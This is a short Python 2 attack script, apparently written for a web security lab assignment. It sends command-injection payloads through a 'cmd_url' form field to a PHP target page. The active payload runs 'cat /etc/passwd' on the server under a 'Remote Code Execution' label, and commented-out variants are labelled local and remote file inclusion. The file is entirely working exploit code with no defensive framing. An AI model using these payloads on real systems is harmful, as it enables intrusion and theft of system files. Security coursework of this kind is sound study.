import os
import urllib
import urllib2
import webbrowser


def sendData(values):
    data = urllib.urlencode(values)
    # submit the form
    req = urllib2.Request(url, data)
    rsp = urllib2.urlopen(req)
    # read the return result
    return rsp.read()


def openTab(filename, content):
    with open(filename, "w") as file:
        file.write(content)
        file.close()

        webbrowser.open(
            'file://' + os.path.join(os.getcwd(), filename), new=2)


url = 'http://www.wsb.com/Assignment2/case31.php'

# category: 3 Remote Code Execution
values = dict(cmd_url='cat /etc/passwd')
openTab('temp_file_1.html', sendData(values))

# category: 6 Local File Inclusion (LFI only)
# values = dict(cmd_url='cat lfi.txt.php')
# openTab('temp_file_2.html', sendData(values))

# category: 7 Remote File Inclusion
# values = dict(cmd_url='sh rfi.txt.php')
# openTab('temp_file_3.html', sendData(values))
